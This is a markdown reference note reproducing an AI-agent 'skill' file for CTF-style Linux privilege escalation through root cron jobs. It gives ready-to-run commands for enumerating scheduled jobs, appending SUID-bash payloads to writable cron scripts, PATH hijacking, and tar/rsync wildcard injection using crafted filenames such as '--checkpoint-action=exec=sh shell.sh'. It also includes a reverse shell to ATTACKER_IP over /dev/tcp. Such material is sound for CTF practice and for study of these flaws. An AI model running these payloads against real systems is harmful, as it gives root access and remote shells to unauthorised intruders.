# Cron Jobs & PATH / Wildcard Hijacking

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-linux/cron-path-hijack.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-linux/cron-path-hijack.md)

---

---
name: cron-path-hijack
category: host-linux
triggers: ["writable cron", "crontab", "cron.d", "wildcard injection", "tar wildcard", "PATH hijack", "writable PATH dir", "pspy root job", "scheduled task"]
tools: ["pspy", "crontab", "find", "ls", "tar", "rsync"]
priority: high
description: Escalate via root cron jobs — writable scripts, PATH hijacking, and wildcard (tar/rsync/chown) injection.
---
# Cron Jobs & PATH / Wildcard Hijacking

## Trigger context
A root-owned scheduled job (cron, systemd timer, or a custom loop caught by `pspy`) runs on a schedule and touches something you control: a writable script, a script that calls binaries by relative name, or a command using a shell wildcard (`*`) over a directory you can write to.

## Objective
Get code executed in the context of the job's owner (usually root) by controlling what the scheduled command reads or runs.

## Methodology (decision tree)
1. Enumerate all scheduled work and, crucially, watch it live with `pspy` (cron entries can be root-only unreadable but still visible as running processes).
2. For each root job identify the weak link:
   - The script file itself is writable by you -> overwrite/append a payload.
   - The script is not writable but calls a program by bare name AND the crontab sets a PATH that includes (or you can prepend) a writable dir -> PATH hijack.
   - The command runs `tar`/`rsync`/`chown`/`chmod`/`zip` with a `*` over a directory you can write files into -> wildcard argument injection.
   - The script `source`s / reads a config or file in a writable dir -> poison that.
3. Plant the payload, wait for the next tick, collect root.

## Commands & payloads
```bash
# --- Enumerate scheduled jobs ---
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
crontab -l 2>/dev/null; ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all; ls -la /etc/systemd/system/*.timer 2>/dev/null
# LIVE watch (best): reveals hidden/relative-path jobs
./pspy64 -pf -i 1000

# --- 1) Writable cron script: just append a reverse/rootbash payload ---
ls -la /path/to/cronscript.sh                      # confirm you can write
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' >> /path/to/cronscript.sh
# wait one tick, then:
/tmp/rb -p        # -> euid 0
# or reverse shell:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/cronscript.sh

# --- 2) PATH hijack: crontab has PATH=/home/user:/usr/bin and job calls `backup` by name ---
cat /etc/crontab | grep -i PATH                     # note writable dirs listed first
cd /the/writable/PATH/dir
cat > backup <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rb; chmod +s /tmp/rb
EOF
chmod +x backup                                     # cron runs OUR backup as root

# --- 3) Wildcard injection: root runs `tar -czf /bak/a.tgz *` inside /srv/data ---
cd /srv/data                                        # a dir you can write to
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'     # tar treats these filenames as options
# next run executes shell.sh as root -> /tmp/rb -p

# --- Wildcard injection: rsync ---
touch -- '-e sh shell.sh'                            # rsync ... * picks up -e (remote shell)

# --- Wildcard injection: chown/chmod with * (reference-file trick) ---
# root runs: chown -R root:root *   -> you cannot inject, but:
# root runs: chown --reference=... or a chmod * -> use a crafted filename option similarly.
```

## Branching logic
- Script writable -> simplest path; append payload (SUID bash for a stable local root, or a reverse shell).
- Script not writable but references a bare command name -> check the effective PATH of the job (from `/etc/crontab`, the script's own `PATH=` line, or the systemd unit). If a writable dir precedes the real one, PATH hijack.
- Command uses `*` -> identify the exact program: `tar`->`--checkpoint-action`, `rsync`->`-e`, `7z`/`zip`->`@listfile` / `-i@`, `chmod`/`chown`->limited. Create files whose NAMES are the injected options.
- Only a systemd timer -> check whether the executed unit's `ExecStart` script or its `WorkingDirectory` is writable; same three sub-cases apply.
- Job runs as a non-root user -> still useful for lateral movement; re-enumerate as that user.
- Writable directory that is itself IN root's default PATH (rare misconfig) -> drop a binary named like a common command root runs interactively.

## Common pitfalls
- Not using `pspy` — many CTF cron jobs live in root-only files you can't `cat`; you only see them as processes.
- Wrong working directory: the wildcard trick only works if the job's `cd`/`WorkingDirectory` is the dir you wrote into. Confirm with pspy's shown cwd/command.
- Reverse shell that dies before you catch it — prefer SUID-bash for reliability, add the reverse shell as backup.
- Editing a script and breaking its syntax so it errors before your line — append, don't mangle; put your payload on its own line.
- Assuming the tick interval; a `@daily`/weekly job may not fire during your session. Prefer the fastest-firing job or one you can trigger.
- `--checkpoint` filenames must be created with `touch --` so the leading `-` is not parsed as an option to touch itself.

## Proof / verification
- After a tick: `ls -la /tmp/rb` shows `-rwsr-sr-x root root`; `/tmp/rb -p` gives `euid=0`.
- Or your listener catches a root reverse shell (`id` -> uid=0).
- Confirm the job actually ran (pspy shows it, or your marker file's mtime updated) before declaring failure.

## Cross-references
- [sa--instructions--host-linux--linux-enum-linpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--linux-enum-linpeas.md) — running pspy and enumerating cron.
- [sa--instructions--host-linux--suid-sgid.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--suid-sgid.md) — PATH-hijack mechanics shared with SUID binaries.
- [sa--instructions--host-linux--sudo-gtfobins.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--sudo-gtfobins.md) — writable-script trick reused for sudo-allowed scripts.

## Credible sources
- HackTricks cron/scheduled jobs: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- HackTricks wildcard (Spare tricks) & tar/rsync: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html
- pspy: https://github.com/DominicBreuker/pspy
- DefenseCode "Unix wildcards gone wild" (tar/rsync/chown): https://www.exploit-db.com/papers/33930
